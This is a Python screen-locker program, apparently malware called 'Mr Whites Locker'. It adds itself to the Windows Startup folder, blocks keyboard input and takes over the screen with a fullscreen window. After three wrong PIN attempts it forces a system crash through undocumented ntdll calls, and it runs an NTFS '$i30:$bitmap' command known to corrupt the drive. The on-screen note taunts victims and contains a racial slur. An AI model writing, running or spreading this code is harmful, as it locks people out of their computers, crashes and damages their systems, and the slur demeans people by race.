import tkinter as tk
from tkinter import ttk
import ctypes
import subprocess
import os
import sys
import getpass
import keyboard
import ctypes.wintypes
from tkinter import messagebox
from functools import partial

def bsod():
    subprocess.call("cd C:\\:$i30:$bitmap", shell=True)
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))

def startup(path):
    USER_NAME = getpass.getuser()
    global bat_path
    bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
    
    with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
        bat_file.write(r'start "" %s' % path)

def uninstall(wind):
    wind.destroy()
    os.remove(bat_path + '\\' + "open.bat")
    keyboard.unhook_all()

wind = tk.Tk()
password = "12345"
lock_text = "Oops! You have 3 attempts to unlock. After that, your system goes boom :)"
count = 3

file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])
startup(file_path)

def buton(arg):
    enter_pass.insert(tk.END, arg)

def delbuton():
    enter_pass.delete(len(enter_pass.get())-1, tk.END)

def tapp(key):
    pass

def check():
    global count
    if enter_pass.get() == password:
        messagebox.showinfo("ScreenLocker", "UNLOCKED SUCCESSFULLY")
        uninstall(wind)
    else:
        count -= 1
        if count == 0:
            messagebox.showwarning("ScreenLocker", "Number of attempts expired")
            bsod()
        else:
            messagebox.showwarning("ScreenLocker", "Wrong password. Available tries: " + str(count))

def exiting():
    messagebox.showwarning("ScreenLocker", "DEATH IS INEVITABLE")
    wind.destroy()

wind.title("Mr Whites Locker")
wind.configure(bg="#2C3E50")

# Modern font and color styles
font_large = ("Helvetica", 20, "bold")
font_medium = ("Helvetica", 16)
font_small = ("Helvetica", 12)

# Header and warning text
header = tk.Label(wind, text="Fucked By Mr White", bg="#2C3E50", fg="#ECF0F1", font=font_large)
header.pack(pady=20)

lock_message = tk.Label(wind, text=lock_text, bg="#2C3E50", fg="#ECF0F1", font=font_medium, wraplength=600)
lock_message.pack(pady=10)

note = '''Hi, my name is Lust and I'm sorry for whoever has sent you this because you ain't getting anything back because I said so.
I guess this will teach you to NOT DOWNLOAD RANDOM FILES OFF THE INTERNET'''
note_label = tk.Label(wind, text="Note:", bg="#2C3E50", fg="#ECF0F1", font=font_medium)
note_label.pack(pady=5)
note_text = tk.Text(wind, height=6, width=60, bg="#34495E", fg="#ECF0F1", font=font_small, wrap=tk.WORD, bd=0)
note_text.insert(tk.INSERT, note)
note_text.pack(pady=5)
note_text.config(state=tk.DISABLED)

steps_text = '''1. Take your black ass off the net
2. Stop opening random files
3. Nobody is giving you your password to unlock this PC'''
steps_label = tk.Label(wind, text="How to unlock your computer:", bg="#2C3E50", fg="#ECF0F1", font=font_medium)
steps_label.pack(pady=5)
steps_text_widget = tk.Text(wind, height=5, width=60, bg="#34495E", fg="#ECF0F1", font=font_small, wrap=tk.WORD, bd=0)
steps_text_widget.insert(tk.INSERT, steps_text)
steps_text_widget.pack(pady=5)
steps_text_widget.config(state=tk.DISABLED)

# Creating a frame for the keypad
keypad_frame = tk.Frame(wind, bg="#2C3E50")
keypad_frame.pack(pady=20)

button_style = {"bg": "#34495E", "fg": "#ECF0F1", "font": font_medium, "bd": 0, "width": 5, "height": 2}

# Creating number buttons
buttons = [
    ("1", 0, 0), ("2", 1, 0), ("3", 2, 0),
    ("4", 0, 1), ("5", 1, 1), ("6", 2, 1),
    ("7", 0, 2), ("8", 1, 2), ("9", 2, 2),
    ("0", 1, 3), ("Delete", 0, 3), ("Unlock", 2, 3)
]

for (text, col, row) in buttons:
    if text == "Delete":
        button = tk.Button(keypad_frame, text=text, **button_style, command=delbuton)
    elif text == "Unlock":
        button = tk.Button(keypad_frame, text=text, **button_style, command=check)
    else:
        button = tk.Button(keypad_frame, text=text, **button_style, command=partial(buton, text))
    button.grid(row=row, column=col, padx=5, pady=5)

# Entry field for password
enter_pass = tk.Entry(wind, bg="#34495E", fg="#ECF0F1", show='•', font=font_large, justify="center", bd=0, insertwidth=2)
enter_pass.pack(pady=20)

wind.geometry("800x600")
wind.resizable(False, False)
wind.attributes('-topmost', True)
wind.attributes('-fullscreen', True)
wind.protocol("WM_DELETE_WINDOW", exiting)

keyboard.on_press(tapp, suppress=True)

wind.mainloop()
